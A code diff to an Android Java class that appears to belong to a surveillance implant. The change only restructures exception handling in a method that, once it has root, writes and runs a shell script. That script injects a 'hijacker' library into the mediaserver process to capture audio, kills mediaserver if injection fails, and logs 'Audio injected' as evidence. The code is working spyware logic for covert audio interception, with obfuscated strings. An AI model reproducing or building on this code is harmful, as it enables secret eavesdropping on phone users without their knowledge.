@@ -80,7 +80,7 @@ public class Instrument {
 		return true;
 	}
 
-	public boolean startInstrumentation() throws InterruptedException {
+	public boolean startInstrumentation()  {
 		if (!Status.haveRoot()) {
 			if (Cfg.DEBUG) {
 				Check.log(TAG + "(startInstrumentation): Nope, we are not root");
@@ -93,106 +93,113 @@ public class Instrument {
 			return false;
 		}
 
-		if(Status.self().semaphoreMediaserver.tryAcquire(10, TimeUnit.SECONDS)) {
-			try {
-				int pid = getProcessPid(proc);
+		try {
+			if(Status.self().semaphoreMediaserver.tryAcquire(10, TimeUnit.SECONDS)) {
+				try {
+					int pid = getProcessPid(proc);
 
-				if (pid > 0) {
-					// Run the injector
-					String scriptName = "ij";
-					String script = M.e("#!/system/bin/sh") + "\n";
-					script += path + "/" + hijacker + " -p " + pid + " -l " + path + "/" + lib + " -f " + dumpPath + "\n";
+					if (pid > 0) {
+						// Run the injector
+						String scriptName = "ij";
+						String script = M.e("#!/system/bin/sh") + "\n";
+						script += path + "/" + hijacker + " -p " + pid + " -l " + path + "/" + lib + " -f " + dumpPath + "\n";
 
-					Root.createScript(scriptName, script);
-					ExecuteResult ret = Execute.executeRoot(path + "/" + scriptName);
-					if (Cfg.DEBUG) {
-						Check.log(TAG + " (startInstrumentation) exit code: " + ret.exitCode);
-					}
-
-					Root.removeScript(scriptName);
-
-					Utils.sleep(2000);
-					int newpid = getProcessPid(proc);
-					if (newpid != pid) {
+						Root.createScript(scriptName, script);
+						ExecuteResult ret = Execute.executeRoot(path + "/" + scriptName);
 						if (Cfg.DEBUG) {
-							Check.log(TAG + " (startInstrumentation) Error: mediaserver was killed");
+							Check.log(TAG + " (startInstrumentation) exit code: " + ret.exitCode);
 						}
-					}
 
-					File d = new File(dumpPath);
+						Root.removeScript(scriptName);
 
-					boolean started = false;
+						Utils.sleep(2000);
+						int newpid = getProcessPid(proc);
+						if (newpid != pid) {
+							if (Cfg.DEBUG) {
+								Check.log(TAG + " (startInstrumentation) Error: mediaserver was killed");
+							}
+						}
 
-					for (int i = 0; i < 5 && !started; i++) {
-						File[] files = d.listFiles();
-						for (File file : files) {
-							if (file.getName().endsWith(M.e(".cnf"))) {
+						File d = new File(dumpPath);
+
+						boolean started = false;
+
+						for (int i = 0; i < 5 && !started; i++) {
+							File[] files = d.listFiles();
+							for (File file : files) {
+								if (file.getName().endsWith(M.e(".cnf"))) {
+									if (Cfg.DEBUG) {
+										Check.log(TAG + " (startInstrumentation) got file: " + file.getName());
+									}
+									started = true;
+									file.delete();
+
+									if (Cfg.DEMO) {
+										Beep.beep();
+									}
+								}
+
+							}
+							if (!started) {
 								if (Cfg.DEBUG) {
-									Check.log(TAG + " (startInstrumentation) got file: " + file.getName());
+									Check.log(TAG + " (startInstrumentation) sleep 5 secs");
 								}
-								started = true;
-								file.delete();
+								Utils.sleep(2000);
+							}
+						}
 
-								if (Cfg.DEMO) {
-									Beep.beep();
+						if (!started && killed < MAX_KILLED) {
+							if (Cfg.DEBUG) {
+								Check.log(TAG + " (startInstrumentation) Kill mediaserver");
+							}
+							killProc(proc);
+							// Utils.sleep(1000);
+							// newpid = getProcessPid();
+							killed += 1;
+
+							if (started) {
+								if (Cfg.DEBUG) {
+									Check.log(TAG + " (startInstrumentation) Audio Hijack installed");
 								}
+								EvidenceBuilder.info(M.e("Audio injected"));
 							}
 
+							stopMonitor = false;
 						}
-						if (!started) {
+
+						if (pidMonitor == null) {
 							if (Cfg.DEBUG) {
-								Check.log(TAG + " (startInstrumentation) sleep 5 secs");
+								Check.log(TAG + " (startInstrumentation) script: \n" + script);
+								Check.log(TAG + "(startInstrumentation): Starting MeadiaserverMonitor thread");
 							}
-							Utils.sleep(2000);
+
+							pidMonitor = new MediaserverMonitor(newpid);
+							monitor = new Thread(pidMonitor);
+							monitor.start();
+						} else {
+							pidMonitor.setPid(newpid);
 						}
-					}
-
-					if (!started && killed < MAX_KILLED) {
-						if (Cfg.DEBUG) {
-							Check.log(TAG + " (startInstrumentation) Kill mediaserver");
-						}
-						killProc(proc);
-						// Utils.sleep(1000);
-						// newpid = getProcessPid();
-						killed += 1;
-
-						if (started) {
-							if (Cfg.DEBUG) {
-								Check.log(TAG + " (startInstrumentation) Audio Hijack installed");
-							}
-							EvidenceBuilder.info(M.e("Audio injected"));
-						}
-
-						stopMonitor = false;
-					}
-
-					if (pidMonitor == null) {
-						if (Cfg.DEBUG) {
-							Check.log(TAG + " (startInstrumentation) script: \n" + script);
-							Check.log(TAG + "(startInstrumentation): Starting MeadiaserverMonitor thread");
-						}
-
-						pidMonitor = new MediaserverMonitor(newpid);
-						monitor = new Thread(pidMonitor);
-						monitor.start();
 					} else {
-						pidMonitor.setPid(newpid);
-					}
-				} else {
-					if (Cfg.DEBUG) {
-						Check.log(TAG + "(getProcessPid): unable to get pid");
-					}
+						if (Cfg.DEBUG) {
+							Check.log(TAG + "(getProcessPid): unable to get pid");
+						}
 
+					}
+				} catch (Exception e) {
+					if (Cfg.DEBUG) {
+						Check.log(TAG + " (startInstrumentation) Error: " + e);
+					}
+					return false;
+				} finally {
+					deleteHijacker();
+					Status.self().semaphoreMediaserver.release();
 				}
-			} catch (Exception e) {
-				if (Cfg.DEBUG) {
-					Check.log(TAG + " (startInstrumentation) Error: " + e);
-				}
-				return false;
-			} finally {
-				deleteHijacker();
-				Status.self().semaphoreMediaserver.release();
 			}
+		} catch (InterruptedException e) {
+			if (Cfg.DEBUG) {
+				Check.log(TAG + " (startInstrumentation) Error: " + e);
+			}
+			return false;
 		}
 
 		return true;
